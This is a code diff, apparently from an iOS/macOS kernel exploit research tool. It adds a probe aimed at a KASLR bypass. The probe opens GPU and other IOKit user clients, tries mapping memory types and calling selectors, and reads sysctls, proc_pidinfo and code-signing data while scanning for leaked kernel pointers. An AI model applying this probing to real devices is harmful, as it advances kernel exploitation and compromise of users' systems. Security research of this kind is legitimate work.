@@ -98,6 +98,8 @@ extern kern_return_t mach_make_memory_entry_64(
 #include <compression.h>
 #include <stdatomic.h>
 #include <arpa/inet.h>
+#include <libproc.h>
+#include <sys/codesign.h>
 #include <signal.h>
 #include <setjmp.h>
 #include <sched.h>
@@ -15899,6 +15901,253 @@ static void r362_probe(void) {
 
     rlog("  User client scan: %d hits\n", svc_hits);
     rlog("\n=== r362 complete ===\n");
+    fflush(stdout);
+}
+
+/* r379: AGXAccelerator GPU driver + sysctl + proc_info scan for KASLR leak.
+ * IOSurface alone can't bypass KASLR. Try:
+ * 1. AGXAccelerator IOKit user client — MapMemory, selectors, shared memory
+ * 2. Additional sysctls (kern.bootargs, machdep.cpu.*)
+ * 3. proc_pidinfo for kernel-range values
+ * 4. csops (code signing operations)
+ */
+static void r379_probe(void) {
+    rlog("\n=== r379: AGX GPU Driver + Sysctl + Proc_Info Scan ===\n\n");
+    fflush(stdout);
+
+    /* Part 1: Enumerate IOKit services for GPU */
+    rlog("--- Part 1: IOKit GPU service enumeration ---\n");
+    fflush(stdout);
+
+    const char *gpu_classes[] = {
+        "AGXAccelerator", "AGXAcceleratorG16X", "AGXAcceleratorG16P",
+        "AGXAcceleratorG15X", "AGXAcceleratorG15P",
+        "AGXG16XFamilyAccelerator", "AGXG16PFamilyAccelerator",
+        "AGXFamilyAccelerator",
+        "IOGPUDevice", "IOGPUDeviceUserClient",
+        "AppleM2ScalerCSCDriver", "IOAccelerator",
+        "AppleAVE2Driver", "AppleAVE2UserClient",
+        "AppleJPEGDriver",
+        "IOMobileFramebufferUserClient",
+        "AppleKeyStoreUserClient",
+        "AppleSPUProfileDriver",
+        NULL
+    };
+
+    for (int i = 0; gpu_classes[i]; i++) {
+        CFMutableDictionaryRef match = IOServiceMatching(gpu_classes[i]);
+        if (!match) continue;
+        io_iterator_t iter = 0;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMasterPortDefault, match, &iter);
+        if (kr != KERN_SUCCESS || !iter) continue;
+
+        io_service_t svc;
+        while ((svc = IOIteratorNext(iter)) != 0) {
+            io_name_t name;
+            IORegistryEntryGetName(svc, name);
+            rlog("  Found: '%s' class='%s'\n", name, gpu_classes[i]);
+
+            /* Try to open user client */
+            for (uint32_t uctype = 0; uctype <= 5; uctype++) {
+                io_connect_t conn = 0;
+                kr = IOServiceOpen(svc, mach_task_self(), uctype, &conn);
+                if (kr == KERN_SUCCESS && conn) {
+                    rlog("    Opened type=%u conn=0x%x\n", uctype, conn);
+
+                    /* Try MapMemory types 0-15 */
+                    for (uint32_t mt = 0; mt <= 15; mt++) {
+                        mach_vm_address_t addr = 0;
+                        mach_vm_size_t size = 0;
+                        kr = IOConnectMapMemory64(conn, mt, mach_task_self(),
+                            &addr, &size, kIOMapAnywhere);
+                        if (kr == KERN_SUCCESS && size > 0) {
+                            rlog("    MapMemory[%u]: addr=0x%llx size=0x%llx\n",
+                                mt, (unsigned long long)addr,
+                                (unsigned long long)size);
+
+                            /* Scan mapped memory for kernel pointers */
+                            uint8_t *mbase = (uint8_t*)(uintptr_t)addr;
+                            int kptr_count = 0;
+                            for (size_t off = 0; off + 7 < (size_t)size && off < 4096; off += 8) {
+                                uint64_t v;
+                                memcpy(&v, mbase + off, 8);
+                                if (v >= 0xfffffff000000000ULL && v <= 0xffffffffffffffffULL) {
+                                    if (kptr_count < 5)
+                                        rlog("      +%zu: 0x%llx KPTR!\n",
+                                            off, (unsigned long long)v);
+                                    kptr_count++;
+                                }
+                            }
+                            if (kptr_count > 5)
+                                rlog("      ... %d more kptrs\n", kptr_count - 5);
+                            if (kptr_count == 0)
+                                rlog("      No kptrs in first 4K\n");
+
+                            IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                        }
+                    }
+
+                    /* Try scalar selectors 0-30 */
+                    for (uint32_t sel = 0; sel <= 30; sel++) {
+                        uint64_t sout[16] = {0};
+                        uint32_t soutcnt = 16;
+                        kr = IOConnectCallScalarMethod(conn, sel, NULL, 0, sout, &soutcnt);
+                        if (kr == KERN_SUCCESS && soutcnt > 0) {
+                            rlog("    Scalar[%u]: cnt=%u", sel, soutcnt);
+                            for (uint32_t j = 0; j < soutcnt && j < 4; j++) {
+                                int is_kptr = (sout[j] >= 0xfffffff000000000ULL);
+                                rlog(" [%u]=0x%llx%s", j, (unsigned long long)sout[j],
+                                    is_kptr ? "***KPTR***" : "");
+                            }
+                            rlog("\n");
+                        }
+                    }
+
+                    IOServiceClose(conn);
+                } else if (kr != 0xe00002c7) {
+                    rlog("    type=%u kr=0x%x\n", uctype, kr);
+                }
+            }
+            IOObjectRelease(svc);
+        }
+        IOObjectRelease(iter);
+    }
+
+    /* Part 2: Additional sysctls */
+    rlog("\n--- Part 2: Sysctl scan ---\n");
+    fflush(stdout);
+
+    const char *sysctl_names[] = {
+        "kern.bootargs", "kern.bootsessionuuid", "kern.boottime",
+        "kern.osproductversion", "kern.osrelease",
+        "kern.maxvnodes", "kern.maxproc", "kern.maxfilesperproc",
+        "kern.ipc.maxsockbuf", "kern.monotonic.task_thread_counting",
+        "machdep.cpu.brand_string", "machdep.cpu.core_count",
+        "machdep.cpu.thread_count",
+        "hw.cputype", "hw.cpusubtype", "hw.cpufamily",
+        "hw.tbfrequency", "hw.busfrequency",
+        "hw.l1icachesize", "hw.l1dcachesize", "hw.l2cachesize",
+        "hw.pagesize_compat",
+        "security.mac.sandbox.sentinel",
+        "security.mac.amfi.force_policy",
+        "vm.swapusage",
+        NULL
+    };
+
+    for (int i = 0; sysctl_names[i]; i++) {
+        char buf[512] = {0};
+        size_t buflen = sizeof(buf);
+        int ret = sysctlbyname(sysctl_names[i], buf, &buflen, NULL, 0);
+        if (ret == 0) {
+            /* Check if it's a numeric value in kernel range */
+            if (buflen == 4) {
+                uint32_t v32;
+                memcpy(&v32, buf, 4);
+                rlog("  %s = 0x%x (%u)\n", sysctl_names[i], v32, v32);
+            } else if (buflen == 8) {
+                uint64_t v64;
+                memcpy(&v64, buf, 8);
+                int is_kptr = (v64 >= 0xfffffff000000000ULL);
+                rlog("  %s = 0x%llx%s\n", sysctl_names[i],
+                    (unsigned long long)v64,
+                    is_kptr ? " ***KPTR***" : "");
+            } else {
+                /* String or other */
+                buf[buflen < 511 ? buflen : 511] = 0;
+                int printable = 1;
+                for (size_t j = 0; j < buflen && j < 100; j++)
+                    if (buf[j] != 0 && (buf[j] < 0x20 || buf[j] > 0x7e))
+                        { printable = 0; break; }
+                if (printable && buflen > 0 && buflen < 256)
+                    rlog("  %s = \"%s\" (%zu bytes)\n", sysctl_names[i], buf, buflen);
+                else {
+                    rlog("  %s = <%zu bytes>", sysctl_names[i], buflen);
+                    /* Scan for kptrs */
+                    for (size_t off = 0; off + 7 < buflen; off += 8) {
+                        uint64_t v;
+                        memcpy(&v, buf + off, 8);
+                        if (v >= 0xfffffff000000000ULL)
+                            rlog(" +%zu=0x%llx***", off, (unsigned long long)v);
+                    }
+                    rlog("\n");
+                }
+            }
+        } else {
+            rlog("  %s = FAIL (errno=%d)\n", sysctl_names[i], errno);
+        }
+    }
+
+    /* Part 3: proc_pidinfo */
+    rlog("\n--- Part 3: proc_pidinfo ---\n");
+    fflush(stdout);
+
+    pid_t mypid = getpid();
+
+    /* PROC_PIDTASKINFO = 4 */
+    struct proc_taskinfo pti;
+    int ret = proc_pidinfo(mypid, 4, 0, &pti, sizeof(pti));
+    if (ret > 0) {
+        rlog("  PROC_PIDTASKINFO (%d bytes):\n", ret);
+        rlog("    virtual_size=0x%llx resident_size=0x%llx\n",
+            pti.pti_virtual_size, pti.pti_resident_size);
+        rlog("    total_user=%llu total_system=%llu\n",
+            pti.pti_total_user, pti.pti_total_system);
+        rlog("    threads=%d pageins=%d\n",
+            pti.pti_threadnum, pti.pti_pageins);
+        /* Scan raw bytes for kptrs */
+        uint8_t *raw = (uint8_t*)&pti;
+        for (int off = 0; off + 7 < (int)sizeof(pti); off += 8) {
+            uint64_t v;
+            memcpy(&v, raw + off, 8);
+            if (v >= 0xfffffff000000000ULL)
+                rlog("    +%d: 0x%llx ***KPTR***\n", off, (unsigned long long)v);
+        }
+    }
+
+    /* PROC_PIDREGIONINFO = 7 */
+    struct proc_regioninfo pri;
+    ret = proc_pidinfo(mypid, 7, 0, &pri, sizeof(pri));
+    if (ret > 0) {
+        rlog("  PROC_PIDREGIONINFO (%d bytes): addr=0x%llx size=0x%llx\n",
+            ret, pri.pri_address, pri.pri_size);
+        uint8_t *raw = (uint8_t*)&pri;
+        for (int off = 0; off + 7 < (int)sizeof(pri); off += 8) {
+            uint64_t v;
+            memcpy(&v, raw + off, 8);
+            if (v >= 0xfffffff000000000ULL)
+                rlog("    +%d: 0x%llx ***KPTR***\n", off, (unsigned long long)v);
+        }
+    }
+
+    /* Part 4: csops for code signing info */
+    rlog("\n--- Part 4: csops ---\n");
+    fflush(stdout);
+
+    /* CS_OPS_STATUS = 0 */
+    uint32_t cs_status = 0;
+    ret = csops(mypid, 0, &cs_status, sizeof(cs_status));
+    rlog("  CS_OPS_STATUS: ret=%d flags=0x%x\n", ret, cs_status);
+
+    /* CS_OPS_ENTITLEMENTS_BLOB = 7 */
+    uint8_t entbuf[4096] = {0};
+    ret = csops(mypid, 7, entbuf, sizeof(entbuf));
+    rlog("  CS_OPS_ENTITLEMENTS_BLOB: ret=%d errno=%d\n", ret, errno);
+    if (ret == 0) {
+        /* Scan for kptrs in entitlements blob */
+        for (int off = 0; off + 7 < 4096; off += 8) {
+            uint64_t v;
+            memcpy(&v, entbuf + off, 8);
+            if (v >= 0xfffffff000000000ULL)
+                rlog("    +%d: 0x%llx ***KPTR***\n", off, (unsigned long long)v);
+        }
+    }
+
+    /* CS_OPS_TEAMID = 10 */
+    char teamid[256] = {0};
+    ret = csops(mypid, 10, teamid, sizeof(teamid));
+    rlog("  CS_OPS_TEAMID: ret=%d '%s'\n", ret, ret == 0 ? teamid : "N/A");
+
+    rlog("\n=== r379 complete ===\n");
     fflush(stdout);
 }
 
@@ -58244,6 +58493,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 382) {
+            rlog("*** rounds=382: AGX GPU + Sysctl + proc_info + csops ***\n");
+            rlog("  Alternative attack surfaces for KASLR bypass.\n\n");
+            fflush(stdout);
+            r379_probe();
+            goto done;
+        }
         if (rounds == 381) {
             rlog("*** rounds=381: Exhaustive Property + Selector Scan ***\n");
             rlog("  CopyAllValues dump, specific property probing,\n");
@@ -60503,7 +60759,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
